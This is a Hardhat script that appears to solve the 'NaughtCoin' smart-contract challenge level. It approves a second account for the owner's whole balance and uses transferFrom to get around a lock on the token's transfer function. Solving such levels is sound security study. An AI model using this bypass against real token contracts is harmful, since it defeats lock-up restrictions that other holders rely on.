const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xaA321DFF7C2723D1f75ff616012A1D947AEa7175";
  const NaughtCoinContract = await ethers.getContractFactory("NaughtCoin");
  const NaughtCoin = NaughtCoinContract.attach(Instance);

  const ownerInitialBalance = await NaughtCoin.balanceOf(owner.address);
  console.log(ownerInitialBalance);
  // Approve & Transfer From ERC20
  await NaughtCoin.approve(otherAccount.address, ownerInitialBalance);
  console.log("approved");
  await NaughtCoin.connect(otherAccount).transferFrom(
    owner.address,
    otherAccount.address,
    ownerInitialBalance
  );
  const ownerFinalBalance = await NaughtCoin.balanceOf(owner.address);
  console.log(ownerInitialBalance, ownerFinalBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
